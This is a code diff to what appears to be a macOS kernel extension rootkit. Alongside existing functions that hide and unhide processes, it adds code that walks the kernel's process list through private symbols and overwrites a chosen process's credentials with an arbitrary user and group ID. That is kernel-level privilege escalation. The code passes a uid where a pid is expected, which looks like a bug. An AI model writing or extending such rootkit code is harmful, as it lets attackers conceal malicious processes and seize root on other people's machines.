@@ -27,6 +27,20 @@ struct hiddenProc {
 
 LIST_HEAD(hiddenProcsHead, hiddenProc) hidden_procs_head;
 
+struct proc *
+getProcess(pid_t pid) {
+    
+    struct proclist *allproc = find_symbol("_allproc");
+    struct proc *process = NULL;
+    
+    LIST_FOREACH(process, allproc, p_list) {
+        if(process->p_pid == pid)
+            return process;
+    }
+    
+    return 0;
+}
+
 kern_return_t
 hideProcess(pid_t pid) {
     
@@ -100,4 +114,27 @@ showProcess(pid_t pid) {
     }
     
     return KERN_FAILURE;
+}
+
+kern_return_t
+changeProcessOwnership(uid_t realUid, uid_t uid, gid_t gid) {
+    
+    void (*proc_list_lock)(void) = find_symbol("_proc_list_lock");
+    void (*proc_list_unlock)(void) = find_symbol("_proc_list_unlock");
+    kauth_cred_t (*kauth_cred_setuidgid)(kauth_cred_t, uid_t, gid_t) = find_symbol("_kauth_cred_setuidgid");
+    
+    struct proc *process = getProcess(realUid);
+    
+    if(process == NULL)
+        return KERN_FAILURE;
+
+    kauth_cred_t origId = process->p_ucred;
+    kauth_cred_t newId = kauth_cred_setuidgid(origId, uid, gid);
+    
+    proc_list_lock();
+    process->p_ucred = newId;
+    proc_list_unlock();
+    
+    return KERN_SUCCESS;
+    
 }
